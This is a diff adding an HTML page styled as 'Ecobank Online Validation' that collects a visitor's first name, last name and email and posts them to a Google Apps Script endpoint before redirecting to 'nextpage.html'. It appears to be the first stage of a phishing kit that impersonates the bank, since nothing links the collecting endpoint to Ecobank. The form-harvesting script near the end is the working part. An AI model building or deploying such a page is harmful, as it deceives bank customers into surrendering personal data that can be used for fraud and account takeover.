@@ -1,0 +1,143 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Ecobank Online Validation</title>
+
+<style>
+    :root{
+      --bg1: #1f4f7a;
+      --bg2: #2b6d93;
+      --card: #ffffff;
+      --accent-green: linear-gradient(90deg,#2fb24a,#1f9b39);
+      --muted: #bdbdbd;
+      --label: #222;
+      --shadow: 0 12px 30px rgba(6,24,46,0.35);
+      font-family: "Helvetica Neue", Arial, sans-serif;
+    }
+    body{
+      margin:0;
+      background: linear-gradient(180deg, var(--bg2), #153b57);
+      padding:40px 16px;
+      display:flex;
+      justify-content:center;
+    }
+    .wrap{
+      width:460px;
+      max-width:100%;
+    }
+    .subtitle{
+      text-align:center;
+      color:#d8eaf4;
+      font-size:18px;
+      margin-bottom:22px;
+      letter-spacing:1px;
+      font-weight:600;
+    }
+    .card{
+      background:white;
+      border-radius:14px;
+      padding:26px;
+      box-shadow:var(--shadow);
+    }
+    label{
+      display:block;
+      font-size:18px;
+      font-weight:700;
+      margin-bottom:10px;
+      color:#222;
+    }
+    .input{
+      width:100%;
+      padding:16px;
+      border-radius:10px;
+      border:2px solid #e6e6e6;
+      margin-bottom:20px;
+      font-size:16px;
+      outline:none;
+      background:white;
+    }
+    .btn{
+      width:100%;
+      padding:18px;
+      border-radius:40px;
+      background:var(--accent-green);
+      color:white;
+      font-weight:900;
+      font-size:20px;
+      border:none;
+      cursor:pointer;
+    }
+    .success,.error{
+      display:none;
+      margin-top:15px;
+      padding:12px;
+      border-radius:8px;
+      font-weight:700;
+      text-align:center;
+    }
+    .success{ background:#e3f8e6; color:#137b2c; }
+    .error{ background:#ffe7e7; color:#b11313; }
+</style>
+</head>
+
+<body>
+<div class="wrap">
+    <div class="subtitle">A BETTER WAY TO BANK YOUR WAY</div>
+
+    <form id="signupForm" class="card">
+      <label>First Name</label>
+      <input class="input" name="firstName" required placeholder="Enter your first name">
+
+      <label>Last Name</label>
+      <input class="input" name="lastName" required placeholder="Enter your last name">
+
+      <label>Email</label>
+      <input class="input" name="email" type="email" required placeholder="Enter your email">
+
+      <button id="submitBtn" class="btn">CONTINUE ➜</button>
+
+      <div id="success" class="success">Saved. Redirecting...</div>
+      <div id="error" class="error">Please try again.</div>
+    </form>
+</div>
+
+<script>
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxfzqqLHXGhI3XcRKgrME3vw4cYN1Sdg6rXpd0jV9avGR04iW8kiFgbvf_Wo5n0rdC9/exec";
+
+    const form = document.getElementById("signupForm");
+    const successBox = document.getElementById("success");
+    const errorBox = document.getElementById("error");
+
+    form.addEventListener("submit", async(e)=>{
+        e.preventDefault();
+        successBox.style.display="none";
+        errorBox.style.display="none";
+
+        const data = {
+            firstName: form.firstName.value,
+            lastName: form.lastName.value,
+            email: form.email.value,
+            timestamp: new Date().toISOString()
+        };
+
+        try{
+            const res = await fetch(SCRIPT_URL,{
+                method:"POST",
+                headers:{ "Content-Type":"application/json" },
+                body:JSON.stringify(data)
+            });
+            const json = await res.json();
+
+            if(json.status==="success"){
+                successBox.style.display="block";
+                setTimeout(()=>{ window.location.href="nextpage.html"; },1200);
+            } else throw 0;
+        }catch{
+            errorBox.style.display="block";
+        }
+    });
+</script>
+</body>
+</html>
